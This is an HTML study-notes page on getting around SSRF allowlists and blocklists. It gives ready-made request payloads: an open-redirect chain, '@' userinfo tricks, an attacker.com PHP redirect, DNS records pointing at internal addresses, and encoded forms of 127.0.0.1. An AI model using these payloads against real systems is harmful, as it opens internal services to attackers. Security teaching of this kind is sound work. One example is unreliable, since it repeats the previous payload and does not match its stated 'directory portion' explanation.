<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Bypass common SSRF defenses</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Bypass common SSRF defenses</h1><br/>In this chapter we will se how circumventing defenses aimed at preventing malicious SSRF exploitation.<br /><br />If we get an error like this:<br />    <a href=""><img src="images/2234-1.png" alt="images/2234-1.png" /></a><br />Means that our SSRF is been blocked by a protection mechanism, possibly a URL allowlist or blocklist.<br /><br /><br /><br /><strong><h3>Bypass Allowlists</h3></strong><br />Allowlists are generally the hardest to bypass, because they are, by default, stricter than blocklists. <br />• exploit an <strong>Open Redirect</strong> of another url to request a page in our SSRF<br />    <span style="color:#a52a2a;">example:</span>  even if the site allows only profile pictures uploaded from one of its subdomains, you can induce an SSRF through an open redirect.<br />    <div class="codebox"><pre>POST <span style="color:#ff9d00;font-weight:700">/</span>upload_profile_from_url<br />Host<span style="color:#ff9d00;font-weight:700">:</span> public.example.com<br /><br /><span style="color:#7f0044;font-weight:400">user_id</span>=1234<span style="color:#ff9d00;font-weight:700">&amp;</span>url=https<span style="color:#ff9d00;font-weight:700">://</span>pics.example.com<span style="color:#ff9d00;font-weight:700">/</span>123?redirect=127.0.0.1</pre></div><br />• exploit <strong>poorly designed regular expressions</strong> (regexes) allowed lists. <br />    A site can check regex expressions like .*example.com.* to match the subdomains and filepaths of example.com as well.<br />    <span style="color:#a52a2a;">example:</span> Since in the example below pics.example.com is seen as the username portion of the URL, then it will redirect to 127.0.0.1<br />    <div class="codebox"><pre>POST <span style="color:#ff9d00;font-weight:700">/</span>upload_profile_from_url<br />Host<span style="color:#ff9d00;font-weight:700">:</span> public.example.com<br /><br /><span style="color:#7f0044;font-weight:400">user_id</span>=1234<span style="color:#ff9d00;font-weight:700">&amp;</span>url=https<span style="color:#ff9d00;font-weight:700">://</span>pics.example.com@127.0.0.1</pre></div><br />    <span style="color:#a52a2a;">example:</span> Since pics.example.com is seen as the directory portion of the URL, then it will redirect to 127.0.0.1<br />    <div class="codebox"><pre>POST <span style="color:#ff9d00;font-weight:700">/</span>upload_profile_from_url<br />Host<span style="color:#ff9d00;font-weight:700">:</span> public.example.com<br /><br /><span style="color:#7f0044;font-weight:400">user_id</span>=1234<span style="color:#ff9d00;font-weight:700">&amp;</span>url=https<span style="color:#ff9d00;font-weight:700">://</span>pics.example.com@127.0.0.1</pre></div><br /><br /><br /><strong><h3>Bypass Blocklists</h3></strong><br />• <strong>Redirect to the Attacker site</strong>:<br />   1) Make the server request a URL that you control and that redirects to the blocklisted address<br />    <div class="codebox"><pre>https<span style="color:#ff9d00;font-weight:700">://</span>public.example.com<span style="color:#ff9d00;font-weight:700">/</span>proxy?url=https<span style="color:#ff9d00;font-weight:700">://</span>attacker.com<span style="color:#ff9d00;font-weight:700">/</span>ssrf</pre></div><br />   2) On your server at https://attacker.com/ssrf you can host a file with the following content:<br />    <div class="codebox"><pre>&lt;?php header<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&quot;location: http://127.0.0.1&quot;</span><span style="color:#ff9d00;font-weight:700">);</span> ?&gt;</pre></div><br />    that will redirect the target server to http://127.0.0.1<br />    This attack will bypass blocklists because the URL submitted to the application does not itself contain any blocklisted addresses.<br />• <strong>Tricking the Server with DNS</strong><br />   ◇ DNS A records point a hostname to an IPv4 address<br />   ◇ DNS AAAA records translate hostnames to an IPv6 address<br />   How Trick Target WebServer<br />   1) You can check the current A/AAAA records of your domain by running these commands:<br />       <div class="codebox"><pre>nslookup DOMAIN -type=A<br />nslookup DOMAIN -type=AAAA</pre></div><br />   2) Modify the A/AAAA record of a domain you control and make it point to the internal addresses on the victim’s network. <br />       Go to the web-hosting service’s settings page. Usually you can configure your DNS records by going to your account and choosing:<br />        Domain List → Manage Domain → Advanced DNS → Add New Record<br />       Create a custom mapping of hostname to IP address and make your domain resolve to 127.0.0.1<br />   3)  Ask the target server to send a request to your server<br />       <div class="codebox"><pre>https<span style="color:#ff9d00;font-weight:700">://</span>public.example.com<span style="color:#ff9d00;font-weight:700">/</span>proxy?url=https<span style="color:#ff9d00;font-weight:700">://</span>attacker.com</pre></div><br />• Encoding URL/Addresses (exercise: <a href="erver-side--Server_Side_Attacks--Server_Side_Request_Forgery_(SSRF)--Bypass_common_SSRF_defenses--SSRF_with_blacklist-based_input_filters.html">SSRF with blacklist-based input filters</a>)<br />   Encodings for 127.0.0.1<br />   ◇ Hex format → 0x7f.0x0.0x0.0x1<br />      <div class="codebox"><pre>https<span style="color:#ff9d00;font-weight:700">://</span>public.example.com<span style="color:#ff9d00;font-weight:700">/</span>proxy?url=https<span style="color:#ff9d00;font-weight:700">://</span>0x7f.0x0.0x0.0x1</pre></div><br />   ◇ Octal format → 0177.0.0.01<br />      <div class="codebox"><pre>https<span style="color:#ff9d00;font-weight:700">://</span>public.example.com<span style="color:#ff9d00;font-weight:700">/</span>proxy?url=https<span style="color:#ff9d00;font-weight:700">://</span>0177.0.0.01</pre></div><br />   ◇ Dword format → 2130706433<br />      127×256<sup>3</sup> + 0 ×256<sup>2</sup>  + 0 × 256<sup>1</sup> + 1 × 256<sup>0</sup> <br />      <div class="codebox"><pre>https<span style="color:#ff9d00;font-weight:700">://</span>public.example.com<span style="color:#ff9d00;font-weight:700">/</span>proxy?url=https<span style="color:#ff9d00;font-weight:700">://</span>2130706433</pre></div><br />   ◇ Double Word format<br />   ◇ localhost URL encoded →  %6c%6f%63%61%6c%68%6f%73%74<br />       <div class="codebox"><pre>https<span style="color:#ff9d00;font-weight:700">://</span>public.example.com<span style="color:#ff9d00;font-weight:700">/</span>proxy?url=https<span style="color:#ff9d00;font-weight:700">://</span>%6c%6f%63%61%6c%68%6f%73%74</pre></div><br />   ◇ Use a combination of the above:<br />        <span style="color:#a52a2a;">example:</span> 0177.0.0.0x1<br />      ▪ the first section uses octal encoding<br />      ▪ the next two use decimal encoding<br />      ▪ the last section uses hex encoding<br /> <br />         <br /><br /><br /><br /><br /><br />Bibliography:<br />• <a href="https://portswigger.net/web-security/ssrf">https://portswigger.net/web-security/ssrf</a><br />• <a href="https://www.amazon.com/Bug-Bounty-Bootcamp-Reporting-Vulnerabilities/dp/1718501544">Bug Bounty Bootcamp: The Guide to Finding and Reporting Web</a></div>
</body>
</html>
